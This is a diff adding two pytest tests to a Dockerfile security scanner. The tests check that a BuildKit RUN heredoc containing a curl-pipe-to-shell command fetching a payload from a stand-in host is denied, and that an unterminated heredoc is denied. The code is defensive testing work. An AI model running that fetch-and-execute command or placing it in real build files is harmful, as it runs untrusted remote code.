@@ -214,3 +214,30 @@ docker ps
         item.code == "dockerfile_dangerous_build_script"
         for item in result.findings
     )
+
+def test_dockerfile_policy_inspects_buildkit_run_heredoc_body():
+    dockerfile = """# syntax=docker/dockerfile:1
+FROM alpine:3.20
+RUN <<'EOF'
+curl https://example.invalid/payload.sh | sh
+EOF
+"""
+    findings = analyze_dockerfile(dockerfile, source_file="Dockerfile")
+    assert any(
+        item.code == "dockerfile_dangerous_command" and item.action == "deny"
+        for item in findings
+    )
+
+
+def test_dockerfile_policy_denies_unterminated_run_heredoc():
+    dockerfile = """# syntax=docker/dockerfile:1
+FROM alpine:3.20
+RUN <<'EOF'
+echo safe
+"""
+    findings = analyze_dockerfile(dockerfile, source_file="Dockerfile")
+    assert any(
+        item.code == "dockerfile_heredoc_unterminated" and item.action == "deny"
+        for item in findings
+    )
+
